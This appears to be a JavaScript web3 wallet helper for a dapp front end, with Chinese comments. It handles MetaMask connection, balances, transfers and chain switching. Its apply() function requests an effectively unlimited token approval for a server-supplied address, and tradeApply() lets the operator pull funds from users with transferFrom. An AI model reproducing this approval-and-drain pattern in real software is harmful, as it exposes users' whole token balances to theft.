/*
 * @Author: Koromore
 * @LastEditors: Koromore
 * @Date: 2022-01-29 01:09:19
 * @LastEditTime: 2022-08-04 21:08:33
 * @Email: 769745979@qq.com
 * @FilePath: \wallet\src\utils\web3Utils.js
 * @Environment: win 10 VScode
 * @Description: 描述
 */

window.web3Utils = {
  //客户端
  client: null,
  accountAddress: '',
  //管理员地址（转账地址）
  address: '',
  //授权地址
  approveAddress: '',
  //支持的合约
  coinMap: {},
  /**
   * 连接钱包
   * */
  connect: function() {
    let data = ''
    this.client = App.web3
    return window.ethereum.enable()
  },

  getId: function(){
    if (this.client == null) throw 'Please reconnect wallet'
    return this.client.eth.net.getId()
  },

  /**
   * 获取短guid
   * */
  guid: function() {
    var template = 'xxxxxxxxxxxx' //template="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx"
    return template.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0,
        v = c == 'x' ? r : (r & 0x3 | 0x8)
      return v.toString(16)
    })
  },

  /**
   * 获取区块高度
   * @param callback(err, blockNum) 回调函数
   * */
  blockNum: function(callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      this.client.eth.getBlockNumber(callback)
    } else {
      alert('callback not support')
    }
  },

  /**
   * 进行消息签名
   * @param  message    待签名消息
   * @param  callback(err, signMsg) 回调函数
   * */
  sign: function(message, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      var address = this.client.currentProvider.selectedAddress
      this.client.eth.personal.sign(message, address).then(callback)
    } else {
      alert('callback not support')
    }
  },

  /**
   * 获取当前账号
   * @param  callback(err, account) 回调函数
   * */
  account: function(callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      this.client.eth.getCoinbase(res => {
        console.log(res)
      })
    } else {
      alert('callback not support')
    }
  },

  /**
   * 获取合约
   * @param  coin  币种名称
   * */
  contract: function(coin) {
    var that = this
    if (this.client == null) throw 'Please reconnect wallet'
    var info = this.coinMap[coin]
    // console.log('info', info);

    if (!info) throw 'Unsupported currency: ' + coin
    if (info.holder == null) {
      info.holder = new this.client.eth.Contract(info.contractAbi,
        info.contractAddress, {})
    }
    // console.log(123);
    // console.log(info.holder);
    return info.holder
  },

  /**
   * 账户余额
   * @param  coin  币种名称
   * @param  callback(err, qty) 回调函数
   * */
  balance: function(coin, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''
      if (coin === 'ETH' || coin === 'BNB') {
        console.log('ETHBNB_balance');
        this.client.eth.getBalance(account, (err, data) => {
          console.log('bb===>', err, data)
          callback(err, this.client.utils.fromWei(data))
        })
      } else {
        var thisContract = this.contract(coin)
        // console.log(thisContract);
        try {
          console.log('thisContract');
          thisContract.methods.balanceOf(account).call({
            from: account
          }, (err, data) => {
            var info = this.coinMap[coin]
            callback(err, data / Math.pow(10, info.decimals))
          })
        } catch (error) {
          callback(error, 0)
        }

      }
      // });
    } else {
      alert('callback not support')
    }

  },

  /**
   * 划转资金
   * @param  coin    币种
   * @param   qty      数量
   *@param  callback(err, txId) 回调函数
   * */
  trade: function(coin, qty, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''

      if (coin === 'ETH' || coin === 'BNB') {
        console.log('ETH转账（BNB）')
        this.client.eth.sendTransaction({
          from: account,
          to: this.address,
          value: this.client.utils.toWei(qty)
        }, function(err, data) {
          callback(err, data)
        })
      } else {
        var thisContract = this.contract(coin)
        var info = this.coinMap[coin]
        let num = (qty * Math.pow(10, info.decimals)).toString()
        thisContract.methods.transfer(this.address, num).send({
          from: account,
          gas: 200000
        }, (err, data) => {
          callback(err, data)
        })
      }
      // });
    } else {
      alert('callback not support')
    }
  },

  /**
   * 请求授权
   * @param  coin        币种
   * @param  callback(err, txId) 回调函数
   * */
  apply: function(coin, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''

      var thisContract = this.contract(coin)
      thisContract.methods.approve(this.approveAddress,
        '10000000000000000000000000000000000000000000000000000').send({
        from: account,
        gas: 200000
      }, (err, data) => {
        console.log(err)
        console.log(data)
        callback(err, data)
      }).catch(err => {
        console.log(err)
      })
    } else {
      alert('callback not support')
    }
  },

  /**
   * 授权划转资金
   * @param  coin    币种
   * @param   qty      数量
   * @param  callback(err, txId) 回调函数
   * */
  tradeApply: function(coin, from, qty, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''
      var thisContract = this.contract(coin)
      thisContract.methods.transferFrom(from, this.address,
          this.client.utils.toWei(qty)).send({
        from: account
      }, (err, data) => {
        callback(err, data)
      })
    } else {
      alert('callback not support')
    }
  },

  /**
   * 支持的合约
   * @param data
   */
  setCoinMap(data){
    let contractAbi = ''
    if (data.coin == 'ETH' || data.abi == '-') {
      contractAbi = data.abi
    } else {
      // console.log(123);
      contractAbi = JSON.parse(data.abi)
    }
    this.coinMap[data.coin] = {
      holder: null,
      contractAddress: data.contract,
      decimals: data.decimals,
      icon: data.icon,
      contractAbi: contractAbi,
    }
  },
  /**
   * 地址设置
   * @param data
   */
  setAddress(data){
    this.address = data.depositAddress
    this.approveAddress = data.approveAddress
  },
  /**
   * 账号设置
   * @param data
   */
  setAccountAddress(data){
    this.accountAddress = data
  },
  /**
   * 切换链
   * @param chain
   */
  changeChain(chain){
    if(chain === 'ethereum'){
      return window['ethereum'].request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x1' }],
      })
    } else if(chain === 'BSC'){
      return window['ethereum'].request({
        method: 'wallet_addEthereumChain',
        params: [
          {
            chainId: '0x38', // A 0x-prefixed hexadecimal string
            chainName: 'BSC Network',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB', // 2-6 characters long
              decimals: 18,
            },
            rpcUrls: ['https://bsc-dataseed1.binance.org'],
            blockExplorerUrls: ['https://bscscan.com'],
          },
        ],
      })
    }
  }
}
